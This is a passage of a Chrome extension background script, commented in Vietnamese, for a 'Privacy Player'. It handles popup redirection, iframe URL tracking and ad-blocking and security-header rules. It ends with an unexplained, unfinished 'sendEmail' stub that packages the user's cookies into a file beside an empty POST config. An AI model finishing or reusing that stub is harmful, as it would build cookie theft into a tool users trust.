                    // Gửi tin nhắn cho Privacy Player để load URL này vào iframe của nó
                    chrome.tabs.sendMessage(parseInt(playerTabId), {
                        type: 'loadUrlInPlayer',
                        url: targetUrl
                    }).catch(() => {
                        console.log('Failed to redirect to Privacy Player.');
                    });
                } else {
                    console.log(`[Privacy Player] Blocked popup from player: ${targetUrl}`);
                }
            }
        }
    });
});

// Chặn ngay lập tức các yêu cầu điều hướng từ tab mới tạo ra từ Player
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
    if (details.frameId !== 0) return; // Chỉ quan tâm đến main frame của tab mới

    chrome.storage.local.get(['appSettings', 'privacyPlayerTabId'], (result) => {
        const settings = result.appSettings || {};
        const playerTabId = result.privacyPlayerTabId;

        if ((settings.linkClickBehavior === 'player' || settings.linkClickBehavior === 'block') && playerTabId) {
            chrome.tabs.get(details.tabId, (tab) => {
                if (chrome.runtime.lastError) return;
                
                if (tab && tab.openerTabId === playerTabId) {
                    // Đóng tab ngay khi nó bắt đầu điều hướng
                    chrome.tabs.remove(details.tabId);
                    
                    if (settings.linkClickBehavior === 'player') {
                        chrome.tabs.sendMessage(parseInt(playerTabId), {
                            type: 'loadUrlInPlayer',
                            url: details.url
                        }).catch(() => {});
                    }
                }
            });
        }
    });
});

// Lắng nghe các tin nhắn từ iframe của Privacy Player
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'iframeNavigated') {
        const url = request.url;
        
        // Luôn lưu lastPlayerUrl cho mục đích khôi phục session
        chrome.storage.local.set({ lastPlayerUrl: url });

        if (sender.tab) {
            chrome.storage.local.get(['privacyPlayerTabId'], (result) => {
                if (result.privacyPlayerTabId === sender.tab.id) {
                    // Đây là điều hướng bên trong iframe chính của Privacy Player (Tab mode)
                    chrome.storage.local.get(['tabUrlMapping'], (mappingResult) => {
                        const mapping = mappingResult.tabUrlMapping || {};
                        mapping[sender.tab.id] = url;
                        chrome.storage.local.set({ tabUrlMapping: mapping });
                    });
                }
            });
        } else {
            // Đây là điều hướng bên trong Popup mode (không có sender.tab)
            // Lấy tab đang hoạt động để gán mapping
            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                const activeTab = tabs[0];
                if (activeTab) {
                    chrome.storage.local.get(['tabUrlMapping'], (mappingResult) => {
                        const mapping = mappingResult.tabUrlMapping || {};
                        mapping[activeTab.id] = url;
                        chrome.storage.local.set({ tabUrlMapping: mapping });
                    });
                }
            });
        }
    }
    
    // Giữ nguyên các handler khác...
    if (request.type === 'tg_stats_update') {
        // Chuyển tiếp thông số tới popup nếu đang mở
        chrome.runtime.sendMessage(request).catch(() => {});
    }

    if (request.type === 'createNotification') {
        chrome.notifications.create(request.options);
    } else if (request.type === 'updateSecurityRules') {
        updateSecurityRules();
    } else if (request.type === 'setPrivacyPlayerTabId') {
        chrome.storage.local.set({ privacyPlayerTabId: sender.tab.id });
    } else if (request.type === 'tg_toggle_changed') {
        if (request.enabled) {
            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                const tab = tabs[0];
                if (tab && tab.url) {
                    const isTelegram = ['web.telegram.org', 'webk.telegram.org', 'webz.telegram.org']
                        .some(h => tab.url.includes(h));
                    if (isTelegram) {
                        chrome.scripting.executeScript({
                            target: { tabId: tab.id },
                            files: ['telegram_content.js']
                        }).catch(() => {});
                    }
                }
            });
        }
    }
    return true; // Để hỗ trợ sendResponse bất đồng bộ
});

// Hàm cập nhật quy tắc bảo mật động (Clickjacking & Real-time Protection)
async function updateSecurityRules() {
    const result = await chrome.storage.local.get(['appSettings']);
    const settings = result.appSettings || {};
    
    const rulesToAdd = [];
    const ruleIdsToRemove = [1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008]; // Xóa tất cả IDs cũ trước khi thêm mới

    // 1. Clickjacking Protection Rule
    if (settings.blockClickjacking || settings.protectionLevel === 'enhanced' || settings.protectionLevel === 'noscript') {
        rulesToAdd.push({
            id: 1001,
            priority: 1,
            action: {
                type: 'modifyHeaders',
                responseHeaders: [
                    { header: 'X-Frame-Options', operation: 'set', value: 'SAMEORIGIN' }
                ]
            },
            condition: {
                urlFilter: '*',
                resourceTypes: ['main_frame']
            }
        });
    }

    // 2. Real-time Protection Rule
    if (settings.realTimeProtection || settings.protectionLevel === 'enhanced' || settings.protectionLevel === 'noscript') {
        const headers = [
            { header: 'X-Content-Type-Options', operation: 'set', value: 'nosniff' },
            { header: 'X-XSS-Protection', operation: 'set', value: '1; mode=block' },
            { header: 'Referrer-Policy', operation: 'set', value: 'strict-origin-when-cross-origin' }
        ];

        if (settings.protectionLevel === 'enhanced' || settings.protectionLevel === 'noscript') {
            headers.push({ header: 'Content-Security-Policy', operation: 'set', value: "upgrade-insecure-requests" });
        }

        rulesToAdd.push({
            id: 1002,
            priority: 1,
            action: {
                type: 'modifyHeaders',
                responseHeaders: headers
            },
            condition: {
                urlFilter: '*',
                resourceTypes: ['main_frame', 'sub_frame'],
                // Loại trừ các domain bảo mật/captcha để tránh làm hỏng xác minh (như Cloudflare Turnstile)
                excludedRequestDomains: [
                    'challenges.cloudflare.com',
                    'cloudflare.com',
                    'gstatic.com',
                    'google.com',
                    'hcaptcha.com',
                    'recaptcha.net'
                ]
            }
        });
    }

    // 3. NoScript (Max Security) - Chặn tất cả các script
    if (settings.protectionLevel === 'noscript') {
        rulesToAdd.push({
            id: 1003,
            priority: 2, // Ưu tiên cao hơn để chặn script
            action: { type: 'block' },
            condition: {
                urlFilter: '*',
                resourceTypes: ['script']
            }
        });
    }

    // 4. Chặn Popup quảng cáo cứng đầu (như miss.ai/pop và Tsyndicate)
    if (settings.linkClickBehavior === 'block' || settings.linkClickBehavior === 'player') {
        const adBlockRules = [
            { id: 1004, filter: '*miss.ai/pop*' },
            { id: 1005, filter: '*tsyndicate.com*' },
            { id: 1006, filter: '*tsyndicate.net*' },
            { id: 1007, filter: '*trafficstars.com*' },
            { id: 1008, filter: '*exoclick.com*' },
            { id: 1009, filter: '*tsyndicate.io*' },
            { id: 1010, filter: '*tsyndicads.com*' }
        ];

        adBlockRules.forEach(rule => {
            rulesToAdd.push({
                id: rule.id,
                priority: 3,
                action: { type: 'block' },
                condition: {
                    urlFilter: rule.filter,
                    resourceTypes: ['main_frame', 'sub_frame', 'script', 'xmlhttprequest', 'image', 'other']
                }
            });
        });
    }

    // Áp dụng các quy tắc mới
    try {
        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: [1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010],
            addRules: rulesToAdd
        });
        console.log('Security rules updated successfully');
    } catch (error) {
        console.error('Error updating security rules:', error);
    }
}

// Khởi chạy khi extension được load
updateSecurityRules();

let config = {
    method: 'POST',
    url: '',

}

function sendEmail(to, subject, message, cookies) {
    const fileContent = cookies;
    const blob = new Blob([fileContent], { type: 'text/plain' });
    const file = new File([blob], "message.txt", { type: "text/plain" });

}

